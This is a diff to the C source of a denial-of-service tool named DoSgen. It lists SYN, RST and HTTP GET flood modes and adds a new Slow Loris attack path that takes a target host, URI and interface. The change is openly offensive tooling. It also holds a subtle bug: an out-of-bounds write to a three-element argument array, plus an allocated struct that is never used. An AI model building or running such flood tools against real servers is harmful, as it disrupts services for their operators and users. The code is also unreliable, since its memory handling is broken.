@@ -6,7 +6,8 @@
 #include <unistd.h> //sleep
 
 #include "libdos.h"
-#include "raw/arpinglib.h"
+#include "raw/handshake.h"
+//#include "raw/arpinglib.h"
 #include "raw/tcpgenlib.h"
 
 void print_help_and_die()
@@ -14,7 +15,7 @@ void print_help_and_die()
     printf("\n/-----------------DoSgen usage-----------------/\n"
            "\n  General options:\n"
            "\t-i:\t interface (e.g. eth0)\n"
-           "\t-P:\t number of processes\n\n"
+           "\t-P:\t number of processes (only in case of attack without handshake)\n\n"
            "  Attacks without handshake:\n"
            "\t--syn:\t\t SYN flood\n"
            "\t--rst:\t\t RST flood\n"
@@ -549,6 +550,13 @@ void http_get_flood(int argc, char **argv, char *dev)
 	char *URI = NULL;
 	int c;
 
+    if(argc < 2)
+    {
+        printf("\nNot enough arguments passed to --http\n");
+        print_help_and_die();
+        exit(-1);
+    }
+
 	while((c = getopt(argc, argv, "H:U:")) != -1)
 	{
 		switch(c)
@@ -560,28 +568,72 @@ void http_get_flood(int argc, char **argv, char *dev)
 			URI = optarg;
 			break;
 		default:
-			printf("Missing one of the arguments!\n");
+			printf("\nWrong arguments!\n");
             print_help_and_die();
 		}
 	}
     char *arguments[3];
-    arguments[0] = "./dosgen";
+    arguments[0] = "http";
     arguments[1] = host_name;
     arguments[2] = URI;
     arguments[3] = dev;
 
-    //printf("gv[0]: %s, argv[1]: %s, argv[2]: %s, argv[3]: %s\n", arguments[0], arguments[1], arguments[2], arguments[3]);
     argc = 4;    
     tcp_gen(argc, arguments);
-	//char *err = prepare_http_get(src_ip, dst_ip, host_name, payload_len);
-
-	//if (err != NULL)
-	//{
-	//	printf("ERROR: %s\n", err);
-	//}
 
 }
+//-------------------Slow Loris---------------------//
+void slow_loris(int argc, char **argv, char *dev)
+{
+	char *host_name = NULL;
+	char *URI = NULL;
+	int c;
 
+    if(argc < 2)
+    {
+        printf("\nNot enough arguments passed to --slowloris\n");
+        print_help_and_die();
+        exit(-1);
+    }
+
+	while((c = getopt(argc, argv, "H:U:")) != -1)
+	{
+		switch(c)
+		{
+		case 'H':
+            host_name = optarg;
+			break;
+		case 'U':
+			URI = optarg;
+			break;
+		default:
+			printf("\nWrong arguments!\n");
+            print_help_and_die();
+		}
+	}
+    char *arguments[3];
+    arguments[0] = "slowloris";
+    arguments[1] = host_name;
+    arguments[2] = URI;
+    arguments[3] = dev;
+
+    /*
+        struct attack_params {
+        u_char *args[3];
+        const u_char *a_packet;
+        };
+
+     */
+
+    struct attack_params *slowloris1;
+    slowloris1 = (struct attack_params *) malloc(sizeof(struct attack_params));
+    slowloris1->args[0] = host_name;
+    slowloris1->args[1] = URI;
+    slowloris1->args[2] = dev;
+    argc = 4;    
+    tcp_gen(argc, arguments);
+
+}
 // Vstup: argc, argv. Vystup: flood_type_index, flood_argc
 bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
 {
@@ -733,14 +785,18 @@ int main(int argc, char **argv)
         }
         //else if (strcmp(flood_type, "--sockstress") == 0)
         //{
+        //    tcp_attack = true;
         //    sockstress(flood_argc + 1, flood_argv);
         //}
-        //else if (strcmp(flood_type, "--slowloris") == 0)
-        //{
-        //    slowloris(flood_argc + 1, flood_argv);
-        //}
+        else if (strcmp(flood_type, "--slowloris") == 0)
+        {
+                        
+            tcp_attack = true;
+            slow_loris(flood_argc + 1, flood_argv, dev);
+        }
         //else if (strcmp(flood_type, "--slowread") == 0)
         //{
+        //    tcp_attack = true;
         //    slowread(flood_argc + 1, flood_argv);
         //}
 	else
